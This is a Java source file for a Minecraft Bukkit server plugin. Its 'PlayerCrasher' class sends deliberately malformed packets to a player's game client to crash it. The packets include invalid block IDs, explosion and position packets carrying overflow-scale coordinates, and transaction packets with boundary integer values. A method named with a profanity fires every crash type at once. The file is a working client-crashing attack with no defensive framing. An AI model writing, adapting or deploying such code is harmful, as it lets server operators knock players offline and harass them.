package pisi.unitedmeows.seriex.util.crasher;

import java.util.*;
import java.util.function.Function;

import org.bukkit.Location;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_8_R3.*;

public enum PlayerCrasher {
	INSTANCE;

	public void fuck(Player player) {
		Arrays.stream(CrashType.values()).forEach(value -> crash(player, value));
	}

	public void crash(Player player, CrashType type) {
		EntityPlayer entityPlayer = ((CraftPlayer) player).getHandle();
		Packet<?>[] calculate = type.calculate(player);
		if (calculate != null) {
			Arrays.stream(calculate).forEach(entityPlayer.playerConnection::sendPacket);
		}
	}

	public enum CrashType {
		INVALID_BLOCK((Player player) -> {
			Random random = new Random(System.currentTimeMillis());
			Location location = player.getLocation();
			for (int i = 0; i < 10; i++) {
				player.sendBlockChange(location, random.nextInt(0x87D), (byte) 0);
			}
			player.sendBlockChange(location, -6666, (byte) 0);
			player.sendBlockChange(location, 6666, (byte) 0);
			return null;
		}),
		EXPLOSION((Player player) -> {
			double impossibleValue = Double.MAX_VALUE / 0x87D;
			double maxValue = 0x64 - 1E-4;
			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
			double[] values = {
				impossibleValue, maxValue, -impossibleValue, -maxValue
			};
			List<PacketPlayOutExplosion> packets = new ArrayList<>();
			for (int i = 0; i < values.length; i++) {
				double value = values[i];
				PacketPlayOutExplosion explosion = new PacketPlayOutExplosion(value, value, value, impossibleFloat, Collections.emptyList(), new Vec3D(value, value, value));
				packets.add(explosion);
			}
			return packets.stream().toArray(PacketPlayOutExplosion[]::new);
		}),
		POSITION((Player player) -> {
			double impossibleValue = Double.MAX_VALUE / 0x87D;
			double maxValue = 0x64 - 1E-4;
			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
			double[] values = {
				impossibleValue, maxValue, -impossibleValue, -maxValue
			};
			List<PacketPlayOutPosition> packets = new ArrayList<>();
			for (int i = 0; i < values.length; i++) {
				double value = values[i];
				PacketPlayOutPosition position = new PacketPlayOutPosition(value, value, value, impossibleFloat, impossibleFloat, Collections.emptySet());
				packets.add(position);
			}
			return packets.stream().toArray(PacketPlayOutPosition[]::new);
		}),
		C0F((Player player) -> {
			List<PacketPlayOutTransaction> packets = new ArrayList<>();
			for (boolean fuck : new boolean[] {
				true, false
			}) {
				packets.add(new PacketPlayOutTransaction(0x7FFFFFFF, (short) 0x7FFF, fuck));
				packets.add(new PacketPlayOutTransaction(0x80000000, (short) 0x8000, fuck));
			}
			return packets.stream().toArray(PacketPlayOutTransaction[]::new);
		});

		private Function<Player, Packet<?>[]> function;

		CrashType(Function<Player, Packet<?>[]> function) {
			this.function = function;
		}

		Packet<?>[] calculate(Player player) {
			return function.apply(player);
		}
	}
}
